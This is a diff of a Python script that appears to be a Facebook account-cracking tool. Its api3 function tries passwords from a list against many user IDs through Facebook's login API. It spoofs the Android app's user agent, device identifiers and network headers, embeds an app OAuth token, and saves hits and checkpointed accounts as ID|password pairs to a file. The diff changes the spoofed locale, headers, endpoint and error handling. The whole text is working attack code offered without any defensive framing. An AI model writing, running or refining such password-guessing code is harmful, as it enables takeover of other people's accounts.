@@ -509,7 +509,7 @@ def api3(ids,names,passlist):
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
-                                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
@@ -523,7 +523,7 @@ def api3(ids,names,passlist):
                                         'generate_session_cookies':'1',
                                         'generate_analytics_claim':'1',
                                         'generate_machine_id':'1',
-                                        "locale":"es_CU","client_country_code":"CU",
+                                        "locale":"en_US","client_country_code":"US",
                                         'device':gtt,
                                         'device_id':adid,
                                         "method": "auth.login",
@@ -531,22 +531,17 @@ def api3(ids,names,passlist):
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':str(random.randint(2e4, 4e4)),
+                                        'x-fb-sim-hni':str(random.randint(3e4, 5e4)),
                                         'x-fb-connection-type':'unknown',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                         'user-agent':ua_string,
-                                        'x-fb-net-hni':str(random.randint(2e4, 4e4)),
-                                        'x-fb-connection-bandwidth':str(random.randint(2e7, 3e7)),
+                                        'x-fb-net-hni':str(random.randint(2e4, 5e4)),
+                                        'x-fb-connection-bandwidth':str(random.randint(4e7, 4e8)),
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
-                                        'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                                        'x-fb-device-group': '5120',
-                                        'x-fb-Friendly-Name': 'ViewerReactionsMutation',
-                                        'x-fb-Request-Analytics-Tags': 'graphservice',
-                                        'x-fb-connection-token': 'd29d67d37eca387482a8',
                                         'accept-encoding':'gzip, deflate',
-                                        'x-fb-http-engine':'Liger'},
-                                url = 'https://b-graph.facebook.com/auth/login'
+                                        'x-fb-http-engine':     'Liger'}
+                                url = ' https://graph.facebook.com/auth/login/'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
@@ -555,14 +550,11 @@ def api3(ids,names,passlist):
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
-                                elif 'www.facebook.com' in q['error']['message']:
+                                elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
                                                 print(f'\r\r\x1b[38;5;126m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open(f'/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
-                                                break
-                                        else:
-                                                open(f'/sdcard/RAHUL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -571,7 +563,7 @@ def api3(ids,names,passlist):
                         time.sleep(10)
                 except Exception as e:
                         pass
-                        
+
                         
 try:
         approval()
